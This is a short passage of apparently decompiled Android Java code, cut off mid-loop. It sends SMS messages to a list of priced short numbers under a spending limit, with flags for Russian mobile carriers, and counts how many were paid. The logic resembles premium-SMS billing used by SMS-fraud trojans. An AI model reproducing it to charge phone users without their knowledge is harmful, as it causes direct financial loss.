                    while (true) {
                        if (currentNumberIndex < prices.size() && ((Double) prices.get(currentNumberIndex).second).doubleValue() >= restAllowedSum) {
                            currentNumberIndex++;
                        } else {
                            if (acceptedNums >= 3 || currentNumberIndex >= prices.size()) {
                                break;
                            }
                            beginSending(settings, context, (String) prices.get(currentNumberIndex).first, smsData, isMTSRF, isBeeline);
                            do {
                                try {
                                    sleep(100L);
                                } catch (InterruptedException e2) {
                                }
                            } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
                            if (settings.getBoolean(Actor.KEY_PAID, false)) {
                                acceptedNums++;
